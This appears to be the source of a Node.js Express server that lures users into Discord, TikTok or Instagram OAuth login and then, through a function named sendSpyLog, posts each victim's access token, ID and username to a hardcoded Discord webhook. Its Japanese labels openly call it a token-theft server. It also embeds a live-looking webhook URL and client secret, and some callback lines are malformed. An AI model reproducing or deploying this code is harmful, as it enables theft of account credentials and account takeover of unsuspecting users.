const express = require('express');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const TikTokStrategy = require('passport-tiktok-auth').Strategy;
const InstagramStrategy = require('passport-instagram').Strategy;
const session = require('express-session');
const axios = require('axios');

const app = express();

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1502931451895742466/5IL4YcyzIPgR5oD0C2-ctrmivrCV71C6apwOPHio_RKJYpMvMuCLPCk__qqX_HCGfK0S';

app.use(session({ secret: 'majin-riron-token-trap', resave: false, saveUninitialized: false }));
app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

async function sendSpyLog(service, profile, accessToken) {
const msg = {
embeds: [{
title: `🚨 【${service} 連携完了】アクセストークン奪取`,
color: service === 'TikTok' ? 0x000000 : (service === 'Instagram' ? 0xE1306C : 0x5865F2),
fields: [
{ name: "👤 表記名", value: `\`${profile.username || profile.displayName || profile.display_name || '不明'}\``, inline: true },
{ name: "🆔 固有ID", value: `\`${profile.id}\``, inline: true },
{ name: "🔑 Access Token", value: `\`\`\`${accessToken}\`\`\`` },
{ name: "🔗 プロフURL", value: service === 'TikTok' ? `https://www.tiktok.com/@${profile.display_name}` : 'DiscordはID検索してな' }
],
footer: { text: "Collected by LOL WEB - Majin Riron" },
timestamp: new Date()
}]
};
try { await axios.post(DISCORD_WEBHOOK, msg); } catch (e) { console.error('Webhook送信失敗'); }
}

passport.use(new DiscordStrategy({
clientID: '1502943408275329175',
clientSecret: 'aCCKBL0JNr430otD2cwAlYkYkbdD9Uda',
callbackURL: 'https://lol-web-server.onrender.com/auth/discord/callback',
scope: ['identify', 'email']
}, (accessToken, refreshToken, profile, done) => {
sendSpyLog('Discord', profile, accessToken);
return done(null, profile);
}));

passport.use(new TikTokStrategy({
clientID: 'あとで書き換える_TIKTOK_KEY',
clientSecret: 'あとで書き換える_TIKTOK_SECRET',
https://lol-web-server.onrender.com/auth/tiktok/callback
scope: ['user.info.basic']
}, (accessToken, refreshToken, profile, done) => {
sendSpyLog('TikTok', profile, accessToken);
return done(null, profile);
}));

passport.use(new InstagramStrategy({
clientID: 'あとで書き換える_INSTA_ID',
clientSecret: 'あとで書き換える_INSTA_SECRET',
https://lol-web-server.onrender.com/auth/instagram/callback
}, (accessToken, refreshToken, profile, done) => {
sendSpyLog('Instagram', profile, accessToken);
return done(null, profile);
}));

app.get('/auth/discord', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
res.redirect(`https://faceidshindan.web.app/aichat.html?name=${encodeURIComponent(req.user.username)}`);
});

app.get('/auth/tiktok', passport.authenticate('tiktok'));
app.get('/auth/tiktok/callback', passport.authenticate('tiktok', { failureRedirect: '/' }), (req, res) => {
res.redirect(`http://127.0.0.1:5500/aichat.html?name=${encodeURIComponent(req.user.display_name)}`);
});

app.get('/auth/instagram', passport.authenticate('instagram'));
app.get('/auth/instagram/callback', passport.authenticate('instagram', { failureRedirect: '/' }), (req, res) => {
res.redirect(`http://127.0.0.1:5500/aichat.html?name=${encodeURIComponent(req.user.username)}`);
});

app.listen(3000, () => console.log('トークン奪取サーバー起動完了 🚀'));
